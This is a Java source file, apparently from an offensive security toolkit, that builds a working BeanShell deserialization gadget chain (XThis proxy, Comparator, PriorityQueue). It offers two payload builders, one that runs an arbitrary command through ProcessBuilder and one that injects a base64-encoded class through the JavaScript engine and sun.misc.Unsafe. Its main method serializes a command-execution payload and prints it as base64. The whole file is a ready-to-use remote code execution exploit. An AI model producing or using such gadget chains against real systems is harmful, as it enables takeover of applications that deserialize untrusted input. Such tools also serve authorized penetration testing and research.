package org.y4sec.gadget;

import bsh.Interpreter;
import org.y4sec.utils.Strings;

import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class BeanShellNoTemplatesImpl {

    private enum PayloadStrategy {
        PROCESS_BUILDER,        // 普通命令执行
        JAVASCRIPT_UNSAFE_CLASS // JS + Unsafe + defineAnonymousClass
    }

    public static Object getObject(String command, PayloadStrategy strategy) throws Exception {

        Interpreter interpreter = new Interpreter();

        // 显式策略选择 payload
        String payload = buildPayload(command, strategy);
        interpreter.eval(payload);

        // ===== 后续利用链完全不变 =====

        Object namespace = interpreter.getNameSpace();

        Class<?> xthisClass = Class.forName("bsh.XThis");
        Constructor<?> constructor = xthisClass.getDeclaredConstructor(
                Class.forName("bsh.NameSpace"),
                Interpreter.class
        );
        constructor.setAccessible(true);
        Object xthis = constructor.newInstance(namespace, interpreter);

        Field handlerField = xthisClass.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerField.get(xthis);

        Comparator<?> comparator = (Comparator<?>) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(),
                new Class[]{Comparator.class},
                handler
        );

        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add("1");
        queue.add("2");

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, comparator);

        return queue;
    }

    // ================= Payload Builder =================

    private static String buildPayload(String command, PayloadStrategy strategy) {
        switch (strategy) {
            case JAVASCRIPT_UNSAFE_CLASS:
                return buildJavaScriptUnsafePayload(command);
            case PROCESS_BUILDER:
            default:
                return buildProcessBuilderPayload(command);
        }
    }

    private static String buildProcessBuilderPayload(String command) {
        return "compare(Object foo, Object bar) {" +
                "new java.lang.ProcessBuilder(new String[]{" +
                Strings.join(
                        Arrays.asList(
                                command.replace("\\", "\\\\")
                                        .replace("\"", "\\\"")
                                        .split(" ")
                        ),
                        ",", "\"", "\""
                ) +
                "}).start();return new Integer(1);}";
    }

    private static String buildJavaScriptUnsafePayload(String base64Class) {
        return "compare(Object foo, Object bar){" +
                "new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\"" +
                "var s='" + base64Class + "';" +
                "var bt;" +
                "try{bt=java.lang.Class.forName('sun.misc.BASE64Decoder')" +
                ".newInstance().decodeBuffer(s);}catch(e){" +
                "bt=java.util.Base64.getDecoder().decode(s);}" +
                "var f=java.lang.Class.forName('sun.misc.Unsafe')" +
                ".getDeclaredField('theUnsafe');" +
                "f.setAccessible(true);" +
                "var u=f.get(null);" +
                "u.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'),bt,null)" +
                ".newInstance();" +
                "\");return new Integer(1);}";
    }

    public static void main(String[] args) throws Exception {

        Object ProcessPayload = getObject(
                "open -a /System/Applications/Calculator.app",
                PayloadStrategy.PROCESS_BUILDER
        );

        Object JavaScriptPayload = getObject(
                "yv66",
                PayloadStrategy.JAVASCRIPT_UNSAFE_CLASS
        );

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(ProcessPayload);

        String serializedString = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(serializedString);

    }
}
